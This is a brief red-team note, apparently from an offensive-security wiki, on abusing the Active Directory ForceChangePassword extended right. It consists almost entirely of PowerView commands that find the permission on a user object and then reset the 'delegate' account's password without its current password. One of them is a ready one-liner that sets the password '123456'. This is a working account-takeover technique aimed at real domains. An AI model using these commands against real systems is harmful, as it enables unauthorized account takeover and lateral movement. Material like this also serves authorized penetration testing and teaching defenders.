# ForceChangePassword

If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password:

```
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

Doing the same with powerview:

```
Set-DomainUserPassword -Identity delegate -Verbose
```

Another method that does not require fiddling with password-secure-string conversion:

```
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```

...or a one liner if no interactive session is not available:

```
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
